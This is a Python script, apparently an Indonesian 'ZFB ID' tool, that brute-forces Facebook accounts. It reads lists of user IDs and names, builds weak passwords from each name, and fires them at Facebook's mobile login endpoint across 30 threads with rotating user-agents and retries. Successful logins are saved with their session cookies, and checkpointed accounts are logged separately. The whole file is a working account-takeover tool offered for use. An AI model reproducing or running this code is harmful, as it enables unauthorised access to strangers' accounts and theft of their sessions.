#coding utf-8
#author: Zoraa Dev
#ZFB ID

import os, re, sys, json, requests, time, uuid, random
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor

class Logo:
    def __init__(self) -> None:
        pass
        
    def ZFB_ID(self):
        Console().print('''\r
╔═╗┌─┐┬─┐┌─┐┌─┐╔═╗╔╗    ╦╔╦╗
╔═╝│ │├┬┘├─┤├─┤╠╣ ╠╩╗───║ ║║
╚═╝└─┘┴└─┴ ┴┴ ┴╚  ╚═╝   ╩═╩╝
''')
        return True

dump = []
class Zoraa_Dev:
    def __init__(self) -> None:
        self.ok, self.cp = self.Tersimpan_Result()
        self.success, self.checkpoint, self.loop = 0,0,0
        pass
        
    def Kalender(self):
        struct_time = time.localtime(time.time())
        return (
            time.strftime('%d', struct_time),
            time.strftime('%B', struct_time),
            time.strftime('%Y', struct_time)
        )
        
    def Tersimpan_Result(self):
        tanggal, bulan, tahun = self.Kalender()
        self.ok = '/sdcard/OK/OK-facebook-{}-{}-{}'.format(tanggal,bulan,tahun)
        self.cp = '/sdcard/CP/CP-facebook-{}-{}-{}'.format(tanggal,bulan,tahun)
        return(self.ok,self.cp)
        
    def Via_File(self):
        try:
            Logo().ZFB_ID()
            Console().print('• banyaknya file, gunakan pemisah koma (,) tanpa spasi')
            query = Console().input('? Input file: ')
            if len(query) > 0:
                for par in query.split(','):
                    for buk in open(str(par)):
                        try:
                            self.userid, self.username = buk.split('|')[0], buk.split('|')[1]
                            if self.userid+'|'+self.username not in dump:
                                dump.append(self.userid+'|'+self.username)
                                Console().print(f'• dump: {str(self.userid)[:20]}/ {len(dump)}', end='\r')
                        except (KeyboardInterrupt, Exception) as e:
                            Console().print(f'• Error: {str(e).title()}')
                    self.ThreadPoolExecutor()
            else:
                exit('• anda tidak memasukan apapun')
        except (KeyboardInterrupt, Exception) as e:
            exit(f'• Error: {str(e).title()}')

    def ThreadPoolExecutor(self):
        try:
            Console().print('\n• Save Ok: {}\n• Save Cp: {}\n'.format(self.ok,self.cp))
            with ThreadPoolExecutor(max_workers=30) as V:
                for UserID_And_Username in dump:
                    self.userid, self.username = UserID_And_Username.split('|')
                    self.password = self.WordList(self.username)
                    V.submit(self.Exec_WbLock, self.userid, self.password)
            Console().print('\n• Hasil Ok: {}\n• Hasil Cp: {}\n[•] Dump: {}'.format(self.success,self.checkpoint,str(len(dump))))
        except (KeyboardInterrupt, Exception) as e:
            exit(f'• Error: {str(e).title()}')
            
    def Exec_WbLock(self, userid, password):
        with requests.Session() as byps:
            for passwd in password:
                try:
                    self.chrome = random.randint(111,139)
                    self.useragents = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36".format(self.chrome)
                    self.get_headers = {
                        "host": "m.facebook.com",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; KirinX Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36",
                        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                        "accept-encoding": "gzip, deflate",
                        "accept-language": "id-ID,id;q=0.9",
                        "priority": "u=1, i"
                     }
                    response = byps.get('https://m.facebook.com/login.php', headers=self.get_headers, allow_redirects=True).text
                    payload = {
                        "__aaid": '0',
                        "__user": "0",
                        "__a": "1",
                        "__req": "8",
                        "__hs": re.search('"haste_session":"(.*?)"',str(response)).group(1),
                        "dpr": "2",
                        "__ccg": re.search('"connectionClass":"(.*?)"',str(response)).group(1),
                        "__rev": "1025824984",
                        "__s": "",
                        "__hsi": re.search('"hsi":"(\d+)"',str(response)).group(1),
                        "__dyn": "",
                        "fb_dtsg": re.search('"dtsg":{"token":"(.*?)"',str(response)).group(1),
                        "jazoest": "24932",
                        "lsd": re.search('"lsd":"(.*?)"',str(response)).group(1),
                        "params": json.dumps({
                            "params": json.dumps({
                                "server_params": json.dumps({
                                    "credential_type":"password",
                                    "username_text_input_id":"emgbxu:71",
                                    "password_text_input_id":"emgbxu:72",
                                    "login_source":"Login",
                                    "login_credential_type":None,
                                    "server_login_source":"login",
                                    "ar_event_source":"login_home_page",
                                    "should_trigger_override_login_success_action":0,
                                    "should_trigger_override_login_2fa_action":0,
                                    "is_caa_perf_enabled":1,
                                    "reg_flow_source":"aymh_single_profile_native_integration_point",
                                    "caller":"gslr",
                                    "is_from_landing_page":0,
                                    "is_from_empty_password":0,
                                    "is_from_aymh":0,
                                    "is_from_password_entry_page":0,
                                    "is_from_assistive_id":0,
                                    "is_from_msplit_fallback":0,
                                    "two_step_login_type":"one_step_login",
                                    "is_vanilla_password_page_empty_password":0,
                                    "INTERNAL__latency_qpl_marker_id":36707139,
                                    "INTERNAL__latency_qpl_instance_id":"88423998600483",
                                    "device_id":str(uuid.uuid4()),
                                    "family_device_id":str(uuid.uuid4()),
                                    "waterfall_id":str(uuid.uuid4()),
                                    "offline_experiment_group":"null",
                                    "layered_homepage_experiment_group":"null",
                                    "is_platform_login":0,
                                    "is_from_logged_in_switcher":0,
                                    "is_from_logged_out":0,
                                    "access_flow_version":"pre_mt_behavior"
                                  }),
                                "client_input_params": json.dumps({
                                    "machine_id":"",
                                    "cloud_trust_token":"null",
                                    "block_store_machine_id":"",
                                    "contact_point":userid,
                                    "password": '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],passwd),
                                    "accounts_list":[],
                                    "fb_ig_device_id":[],
                                    "secure_family_device_id":"",
                                    "encrypted_msisdn":"",
                                    "headers_infra_flow_id":"",
                                    "try_num":1,
                                    "login_attempt_count":1,
                                    "event_flow":"login_manual",
                                    "event_step":"home_page",
                                    "openid_tokens":{},
                                    "auth_secure_device_id":"",
                                    "client_known_key_hash":"",
                                    "has_whatsapp_installed":0,
                                    "sso_token_map_json_string":"",
                                    "should_show_nested_nta_from_aymh":1,
                                    "password_contains_non_ascii":False,
                                    "has_granted_read_contacts_permissions":0,
                                    "has_granted_read_phone_permissions":0,
                                    "app_manager_id":"",
                                    "aymh_accounts": [{"id":"", "profiles":{"":{"credential_type":"","name":"","is_derived":0,"last_access_time":0,"notification_count":0,"password":"","profile_picture_url":"","small_profile_picture_url":"null","token":"","user_id":"","username":"","has_smartlock":0,"account_center_id":"","account_source":"","credentials":[{"credential_type":"none","token":""}],"nta_eligibility_reason":"null","from_accurate_privacy_result":0,"encrypted_user_id":"null","dbln_validated":0}}}],
                                    "lois_settings": json.dumps({
                                        "lois_token": ""
                                     })
                                 }),
                             })
                         }),
                     }
                    self.post_headers = {
                        "host": "m.facebook.com",
                        "content-length": "4319",
                        "sec-ch-ua-full-version-list": "\"Not;A=Brand\";v=\"99.0.0.0\", \"Google Chrome\";v=\"139.0.7258.62\", \"Chromium\";v=\"139.0.7258.62\"",
                        "sec-ch-ua-platform": "\"Android\"",
                        "sec-ch-ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
                        "sec-ch-ua-model": "\"\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-prefers-color-scheme": "dark",
                        "user-agent": self.useragents,
                        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                        "sec-ch-ua-platform-version": "\"\"",
                        "accept": "*/*",
                        "origin": "https://m.facebook.com",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-dest": "empty",
                        "referer": "https://m.facebook.com/login/",
                        "accept-encoding": "gzip, deflate",
                        "accept-language": "id-ID,id;q=0.9",
                        "x-fb-lsd": re.search('"lsd":"(.*?)"',str(response)).group(1),
                        "cookies": "fr=1BjN72JrkUHC03BgX.AWcvum8whY7ywMHph-2c60eLb_Vwj-1VuWcsUn08fPA23ABH_Uw.BonAS6..AAA.0.0.BonATc.AWdE--N48VhGZab8tu4Vp7wxorY",
                        "priority": "u=1, i"
                    }
                    response2 = byps.post('https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=7dc3df7a1c2b41c2ef275eac1130af6da64453b8e5de853b8cf45b43c64d127b',data = payload, headers = self.post_headers)
                    if 'c_user' in byps.cookies.get_dict().keys():
                        self.success+=1
                        cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                        Console().print('''Success:{{
  User ID: {}
  Password: {}
  Cookies: {}
}}'''.format(userid, passwd, cookies))
                        open(self.ok,'a').write('{}|{}|{}\n'.format(userid,passwd,cookies))
                        break             
                    if 'checkpoint' in byps.cookies.get_dict().keys():
                        Console().print('''Checkpoint:{{
  User ID: {}
  Password: {}
}}'''.format(userid, passwd))
                        self.checkpoint+=1
                        open(self.cp,'a').write('{}|{}\n'.format(userid,passwd))
                        break    
                    else: continue   
                except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
                    Console().print('[•] Koneksi Error', end='\r')
                    time.sleep(31)
                    self.Exec_WbLock(userid, password)
            self.loop +=1  
            Console().print(f" • {str(userid)[:15]} {'{:.0%}'.format(self.loop/float(len(dump)))}|{str(len(dump))}|{self.loop} Ok: {self.success}|Cp: {self.checkpoint}", end='\r')
        
    def WordList(self, username):
        self.password = []
        print(username)
        for nama in username.split(' '):
            if len(nama) < 3:
                continue
            else:
                for passwords in [f'{nama}123',f'{nama}1234',f'{nama}12345']:
                    if len(passwords) < 6 or str(passwords).isalnum() == False or len(username.split(' ')) > 6:
                        continue
                    else:
                        self.password.append(f'{str(passwords).lower()}')
        for passwords in [f'{username}', f'{username.replace(" ", "")}']:
            if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                continue
            else:
                self.password.append(f'{str(passwords).lower()}')
        return (self.password)

if __name__ == '__main__':
    os.system('clear')
    try: os.mkdir('/sdcard/OK') or os.mkdir('/sdcard/CP')
    except (Exception) as e: pass
    Zoraa_Dev().Via_File()